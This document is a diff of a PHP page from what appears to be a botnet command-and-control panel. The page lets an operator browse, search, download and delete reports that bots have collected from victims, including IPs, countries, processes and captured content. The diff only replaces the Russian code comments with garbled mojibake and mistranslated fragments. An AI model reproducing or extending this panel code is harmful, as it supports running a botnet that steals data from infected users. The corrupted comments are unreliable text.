@@ -1,21 +1,21 @@
 <?php if(!defined('__CP__'))die();
-define('REPORT_PREVIEW_MAX_CHARS', 100); //Максимальное количество символов в предпросмотре context и path_source.
+define('REPORT_PREVIEW_MAX_CHARS', 100); //RњR RєSЃReRјR ° ° P "SЊRЅRѕRμ RєRѕR" Republic ‡ RμSЃS, RІRѕ SЃReRјRІRѕR "RѕRІ RІ RїSЂRμRґRїSЂRѕSЃRјRѕS, SЂRμ context Pe path_source.
 
 $_allow_remove = !empty($userData['r_reports_db_edit']);
-$rlist = listReportTables($config['mysql_db']); //Получение списка таблиц botnet_reports_*.
+$rlist = listReportTables($config['mysql_db']); //RџRѕR "SѓS ‡ RμRЅReRμ SЃRїReSЃRєR ° C, P ° P ± P" Republic † botnet_reports_ *.
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Вывод отдельного лога.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// R'S <RІRѕRґ RѕS, RґRμR "SЊRЅRѕRіRѕ R" RѕRіR °.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 if(isset($_GET['t']) && isset($_GET['id']))
 {
-  //Ищим таблицу.
+  ////////////////////////////////////////////////// / / ///////////////////////////////////////////////
   $tbl = 0;
   foreach($rlist as $t)if(intval(substr($t, -6)) == $_GET['t']){$tbl = $t; break;}
   if($tbl === 0)ThemeFatalError(LNG_REPORTS_VIEW_NOT_EXISTS);
 
-  //Загрузка файла.
+  //P-P ° RіSЂSѓR · RєR ° C "P ° P № P" P °.
   if(isset($_GET['download']))
   {
     $r = mysqlQueryEx($tbl, "SELECT context, LENGTH(context), path_dest FROM {$tbl} WHERE {$tbl}.id='".addslashes($_GET['id'])."' LIMIT 1");  
@@ -29,20 +29,20 @@ if(isset($_GET['t']) && isset($_GET['id']))
     die();
   }
   
-  //Получаем базовую информацию.   //0            //1            //2                 //3                //4                 //5                 //6                    //7
+  //RџRѕR "SѓS RμRј ‡ P ° P ± P ° P · RѕRІSѓSЋ ReRЅS" RѕSЂRјR ° C † ReSЋ. / / 0 / / 1 / / 2 / / 3 / / 4 / / 5 / / 6 / / 7
   $r = mysqlQueryEx($tbl,
                     "SELECT {$tbl}.bot_id, {$tbl}.botnet, {$tbl}.bot_version, {$tbl}.os_version, {$tbl}.language_id, {$tbl}.time_system, {$tbl}.time_localbias, {$tbl}.time_tick, ".
-                            //8           //9             //10         //11                 //12                 //13                //14                //15             //16                   //17                  //18
+                            //8 / / 9 / / 10 / / 11 / / 12 / / 13 / / 14 / / 15 / / 16 / / 17 / / 18
                     "{$tbl}.rtime, {$tbl}.country, {$tbl}.ipv4, {$tbl}.process_name, {$tbl}.process_user, {$tbl}.path_source, {$tbl}.type, LENGTH({$tbl}.context), {$tbl}.path_dest, botnet_list.comment, botnet_list.flag_used ".
                     "FROM {$tbl} LEFT JOIN botnet_list ON botnet_list.bot_id={$tbl}.bot_id WHERE {$tbl}.id='".addslashes($_GET['id'])."' LIMIT 1");  
   
   if(!$r)ThemeMySQLError();
   if(@mysql_affected_rows() != 1 || !($m = @mysql_fetch_row($r)))ThemeFatalError(LNG_REPORTS_VIEW_NOT_EXISTS);
 
-  //URL для под запросов к отчету.
+  //URL RґR "SЏ RїRѕRґ P · P ° RїSЂRѕSЃRѕRІ Rє RѕS, C ‡ RμS, Sѓ.
   $sub_url = QUERY_STRING_HTML.'&amp;t='.htmlEntitiesEx(urlencode($_GET['t'])).'&amp;id='.htmlEntitiesEx(urlencode($_GET['id']));
   
-  //Проверяем тип отчета.
+  //RџSЂRѕRІRμSЂSЏRμRј C ReRї RѕS, C ‡ RμS, P °.
   $context = '';
   if($m[14] == BLT_FILE || $m[14] == BLT_UNKNOWN)
   {
@@ -63,7 +63,7 @@ if(isset($_GET['t']) && isset($_GET['id']))
     $context = str_replace(array('{COLUMNS_COUNT}', '{WIDTH}', '{TEXT}'), array(2, '100%', htmlEntitiesEx($cc[0])), THEME_LIST_ITEM_PLAIN_U1);
   }
   
-  //Вывод.
+  //R'S <RІRѕRґ.
   $data =
   str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
     str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, sprintf(LNG_REPORTS_VIEW_TITLE2, bltToLng($m[14]), numberFormatAsInt($m[15]))), THEME_LIST_TITLE).
@@ -140,11 +140,11 @@ if(isset($_GET['t']) && isset($_GET['id']))
   die();
 }
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Определяем данные для фильтра.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// RћRїSЂRμRґRμR "SЏRμRј RґR ° RЅRЅS <Rμ RґR" SЏ with "Pepsi" SЊS, SЂR °.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
-//При добавлении новых параметров нужно уничтожать не нужные для js:datelist.
+//RџSЂRe RґRѕR ± P ° RІR "RμRЅReRe RЅRѕRІS <C ... RїR ° ° SЂR RјRμS, SЂRѕRІ RЅSѓR ¶ RЅRѕ SѓRЅReS ‡ C RѕR ¶ P ° C SЊ RЅRμ RЅSѓR ¶ RЅS <Rμ RґR" SЏ js: datelist.
 
 $filter['date1']     = isset($_GET['date1']) ? intval($_GET['date1']) : 0;
 $filter['date2']     = isset($_GET['date2']) ? intval($_GET['date2']) : 0;
@@ -167,18 +167,18 @@ $filter['plain']     = empty($_GET['plain'])    ? 0 : 1;
 
 $filter['rm']        = ($_allow_remove && isset($_GET['rm']) && intval($_GET['rm']) === 1) ? 1 : 0;
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Определяем тип вывода страницы.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// RћRїSЂRμRґRμR "SЏRμRј C ReRї RІS <RІRѕRґR ° SЃS, SЂR ° RЅReS † C <.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
-$_is_ajax_result  = isset($_GET['q']) && $filter['date1'] > 0 && $filter['date2'] > 0;                                //Страница выводиться как результат поиска ajax.
-$_is_ajax_search  = !$_is_ajax_result && $filter['date'] > 0 && isset($_GET['q']);                                     //Страница выводиться как рельутат поиска ajax.
-$_is_plain_search = ($_is_ajax_result && $filter['plain'] == 1 && $filter['rm'] == 0 && $filter['blt'] != BLT_FILE); //Cтраница должна открыться как plain-поиск.
+$_is_ajax_result  = isset($_GET['q']) && $filter['date1'] > 0 && $filter['date2'] > 0;                                //RЎS, SЂR ° RЅReS † P ° RІS <RІRѕRґReS, SЊSЃSЏ RєR ° Rє SЂRμR · SѓR "SЊS, P ° C RїRѕReSЃRєR ° ajax.
+$_is_ajax_search  = !$_is_ajax_result && $filter['date'] > 0 && isset($_GET['q']);                                     //RЎS, SЂR ° RЅReS † P ° RІS <RІRѕRґReS, SЊSЃSЏ RєR ° Rє SЂRμR "SЊSѓS, P ° C RїRѕReSЃRєR ° ajax.
+$_is_plain_search = ($_is_ajax_result && $filter['plain'] == 1 && $filter['rm'] == 0 && $filter['blt'] != BLT_FILE); //MOP, SЂR ° RЅReS RґRѕR † P ° "P ° ¶ RЅR RѕS, RєSЂS <C SЊSЃSЏ RєR ° Rє plain-RїRѕReSЃRє.
 if($_is_plain_search)$_is_ajax_result = false;
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Создание запроса.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// RЎRѕR · RґR ° RЅReRμ P · RїSЂRѕSЃR P ° °.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 if($_is_ajax_search || $_is_plain_search)
 {
@@ -191,7 +191,7 @@ if($_is_ajax_search || $_is_plain_search)
     else $q1[] = "type='".addslashes($filter['blt'])."'";
   }
   
-  if($_is_plain_search)$q1[] = 'type!=\''.BLT_FILE.'\''; //Нельзя искать файлы при текстовом выводе.
+  if($_is_plain_search)$q1[] = 'type!=\''.BLT_FILE.'\''; //RќRμR "SЊR · SЏ ReSЃRєR ° C SЊ C" P ° P № P "C <RїSЂRe C RμRєSЃS, RѕRІRѕRј RІS <RІRѕRґRμ.
 
   $q1[] = expressionToSql($filter['countries'], '`country`', 0, 1);
   $q1[] = expressionToSql($filter['ips'],       '`ipv4`',    1, 1);
@@ -208,7 +208,7 @@ if($_is_ajax_search || $_is_plain_search)
     }
   }
 
-  //Чистим массив.
+  //P § ReSЃS, ReRј RјR ° SЃSЃReRІ.
   foreach($q1 as $k => $v)if($v == '')unset($q1[$k]);
 
   $query1 = count($q1) > 0 ? ' WHERE '.implode(' AND ', $q1) : '';
@@ -220,14 +220,14 @@ if($_is_ajax_search || $_is_plain_search)
   unset($q1);
 }
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// HTML фильтр/результат.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// HTML with "Pepsi" SЊS, SЂ / SЂRμR · SѓR "SЊS, P ° C.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 if(!$_is_ajax_search && !$_is_plain_search)
 {
-  define('INPUT_WIDTH',  '200px'); //Ширина input.text.
-  define('INPUTQ_WIDTH', '500px'); //Ширина input.text.
+  define('INPUT_WIDTH',  '200px'); //REReSЂReRЅR ° input.text.
+  define('INPUTQ_WIDTH', '500px'); //REReSЂReRЅR ° input.text.
 
   $js_qw     = addJsSlashes(LNG_REPORTS_FILTER_REMOVE_Q);
   $js_script = jsCheckAll('botslist', 'checkall', 'bots[]');
@@ -244,7 +244,7 @@ function RemoveReports()
 }
 JS_SCRIPT;
 
-  //Подготовливаем список дат.
+  //RџRѕRґRіRѕS, RѕRІR "ReRІR ° RμRј SЃRїReSЃRѕRє RґR ° C.
   if($_is_ajax_result)
   {
     $datelist = '';
@@ -314,7 +314,7 @@ JS_SCRIPT;
   }
 
   ThemeBegin(LNG_REPORTS, $js_script, getBotJsMenu('botmenu'), $_is_ajax_result ? ' onload="SearchDate(0);"' : 0);
-  //Фильтр.
+  //P ¤ Pepsi "SЊS, SЂ.
   echo str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('filter', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_BEGIN);
   if($_allow_remove)echo str_replace(array('{NAME}', '{VALUE}'), array('rm', 0), THEME_FORM_VALUE);
   echo
@@ -322,7 +322,7 @@ JS_SCRIPT;
     str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
       str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_REPORTS_FILTER_TITLE), THEME_DIALOG_TITLE).
     
-      //Даты.
+      //P "P ° C, C <.
       THEME_DIALOG_ROW_BEGIN.
         str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
           LNG_REPORTS_FILTER_DATE_P1.THEME_STRING_SPACE.
@@ -337,7 +337,7 @@ JS_SCRIPT;
         THEME_DIALOG_ITEM_CHILD_END.
       THEME_DIALOG_ROW_END.
     
-      //Стандартный фильтр.
+      //RЎS, P ° ° RЅRґR SЂS, RЅS <P № C "Pepsi" SЊS, SЂ.
       THEME_DIALOG_ROW_BEGIN.
         str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
           THEME_DIALOG_ROW_BEGIN.
@@ -357,7 +357,7 @@ JS_SCRIPT;
         THEME_DIALOG_GROUP_END.
       THEME_DIALOG_ROW_END.
     
-      //Строка поиска.
+      //RЎS, SЂRѕRєR RїRѕReSЃRєR ° °.
       THEME_DIALOG_ROW_BEGIN.
         str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_GROUP_BEGIN).
           THEME_DIALOG_ROW_BEGIN.
@@ -413,7 +413,7 @@ JS_SCRIPT;
         THEME_DIALOG_GROUP_END.
       THEME_DIALOG_ROW_END.
     
-      //Управление.
+      //RЈRїSЂR ° RІR "RμRЅReRμ.
       str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN).
         str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_RESET, ''), THEME_DIALOG_ITEM_ACTION_RESET).
         THEME_STRING_SPACE.
@@ -423,10 +423,10 @@ JS_SCRIPT;
     THEME_DIALOG_END.
   THEME_FORMGET_END;
 
-  //Вывод результата.
+  //R'S <RІRѕRґ SЂRμR · SѓR "SЊS, P ° C, P °.
   if($_is_ajax_result)
   {
-    //Создание списока дейcтвий.    
+    //RЎRѕR · RґR ° RЅReRμ SЃRїReSЃRѕRєR ° RґRμR number MOP, RІReR №.
     $al = '';
     if($filter['rm'] !== 1 && $filter['nonames'] !== 1 && count($botMenu) > 0)
     {
@@ -437,7 +437,7 @@ JS_SCRIPT;
       $al = THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', $al, THEME_DIALOG_ITEM_TEXT).THEME_DIALOG_ROW_END;
     }
 
-    //Результат.
+    //P RμR · SѓR "SЊS, P ° C.
     echo
     THEME_VSPACE.
     str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('botslist', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_TO_NEW_BEGIN).
@@ -453,12 +453,12 @@ JS_SCRIPT;
 }
 else if($_is_ajax_search)
 {
-  //Ищим таблицу.
+  ////////////////////////////////////////////////// / / ///////////////////////////////////////////////
   $table = 0;
   foreach($rlist as $t)if(intval(substr($t, -6)) == $filter['date']){$table = $t; break;}
   if($table === 0)die(LNG_REPORTS_DATE_EMPTY);
   
-  //Выполняем запрос.
+  //R'S <RїRѕR "RЅSЏRμRј P · P ° RїSЂRѕSЃ.
   if($filter['rm'] === 1)
   {
     if($query1 == '')$q = 'DROP TABLE IF EXISTS '.$table;
@@ -478,11 +478,11 @@ else if($_is_ajax_search)
     if(!$r)die(mysqlErrorEx());
     if(mysql_affected_rows() == 0)die(LNG_REPORTS_DATE_NOREPORTS);
     
-    //Выводим результат.
+    //R'S <RІRѕRґReRј SЂRμR · SѓR "SЊS, P ° C.
     $nn = $filter['nonames']; 
     while(($m = mysql_fetch_row($r)))
     {
-      //Запись нового имени бота.
+      //P-P ° RїReSЃSЊ RЅRѕRІRѕRіRѕ ReRјRμRЅRe P ± RѕS, P °.
       if($nn === 0 && strcasecmp($m[1], $last_botid) !== 0)
       {
         $last_botid = $m[1];
@@ -490,7 +490,7 @@ else if($_is_ajax_search)
              botPopupMenu($m[1], 'botmenu').THEME_STRING_NEWLINE.htmlEntitiesEx($m[2].', '.$m[3]).THEME_STRING_NEWLINE.THEME_STRING_NEWLINE;
       }
       
-      //Запись заголовка лога.
+      //P-P ° P RїReSЃSЊ · P ° RіRѕR "RѕRІRєR ° P" RѕRіR °.
       $st1 = trim($m[4]);
       $st2 = trim($m[5]);
       if(mb_strlen($st1) >= REPORT_PREVIEW_MAX_CHARS)$st1 .= '...';
@@ -521,8 +521,8 @@ else if($_is_ajax_search)
 }
 else if($_is_plain_search)
 {
-  define('REPEAT_SIZE', 40); //Размер визальных разделитилей.
-  define('HEADER_PAD',  30); //Длина заголовков.
+  define('REPEAT_SIZE', 40); //P P ° P · RјRμSЂ RІReR · P ° P "SЊRЅS <C ... SЂR ° F · RґRμR" Res, Pepsi "RμR №.
+  define('HEADER_PAD',  30); //P "P" ReRЅR ° F ° F · RіRѕR "RѕRІRєRѕRІ.
   
   httpNoCacheHeaders();
   httpU8PlainHeaders();
@@ -536,14 +536,14 @@ else if($_is_plain_search)
     {
       $lastdata = array_fill(0, 15, 0);
       
-      //Заголовок даты.
+      //P-P ° RіRѕR "RѕRІRѕRє RґR ° C, C <.
       echo str_repeat('=', REPEAT_SIZE).' '.gmdate(LNG_FORMAT_DATE, gmmktime(0, 0, 0, substr($t, -4, 2), substr($t, -2, 2), substr($t, -6, 2) + 2000)).' '.str_repeat('=', REPEAT_SIZE)."\r\n";
       flush();
       
-      //Запрос.                 //0     //1     //2          //3         //4          //5          //6             //7        //8    //9      //10  //11          //12         //13
+      //P-P ° RїSЂRѕSЃ. / / 0 / / 1 / / 2 / / 3 / / 4 / / 5 / / 6 / / 7 / / 8 / / 9 / / 10 / / 11 / / 12 / / 13
       $r = mysqlQueryEx($t,
                         'SELECT bot_id, botnet, bot_version, os_version, language_id, time_system, time_localbias, time_tick, rtime, country, ipv4, process_name, path_source, type,'.
-                                //14      //15
+                                //14 / / 15
                         'LENGTH(context), context FROM '.$t.$query1.$query2);
       if(!$r)echo mysqlErrorEx();
       else if(mysql_affected_rows() == 0)echo LNG_REPORTS_DATE_NOREPORTS;
@@ -553,7 +553,7 @@ else if($_is_plain_search)
         {
           $hdr = '';
           
-          //FIXME: А где mb_strcasecmp?
+          //FIXME: Rђ RіRґRμ mb_strcasecmp?
           if(strcmp($lastdata[0], $m[0]) !== 0)
           {
             $lastdata = array_fill(0, 15, 0);
@@ -597,18 +597,16 @@ else if($_is_plain_search)
 
 die();
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Функции.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// P ¤ † SѓRЅRєS ReRe.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
-/*
-  Создание списка дат по таблицам botnet_reports_* для элемента select.
-  
-  IN $name  - string, название элемента select.
-  IN $rlist - array, список таблиц.
-  
-  Return    - string, набор THEME_DIALOG_ITEM_LISTBOX_ITEM.
-*/
+/*  RЎRѕR · RґR ° RЅReRμ SЃRїReSЃRєR ° RґR ° C RїRѕ C, P ° P ± P "† P ° Res Rј botnet_reports_ * RґR" SЏ SЌR "RμRјRμRЅS, P ° select.
+  
+  IN $ name - string, RЅR ° F · RІR ° RЅReRμ SЌR "RμRјRμRЅS, P ° select.
+  IN $ rlist - array, SЃRїReSЃRѕRє C, P ° P ± P "Republic of †.
+  
+  Return - string, RЅR ° F ± RѕSЂ THEME_DIALOG_ITEM_LISTBOX_ITEM.*/
 function MakeDateList($name, $rlist)
 {
   $rlist_count = count($rlist);
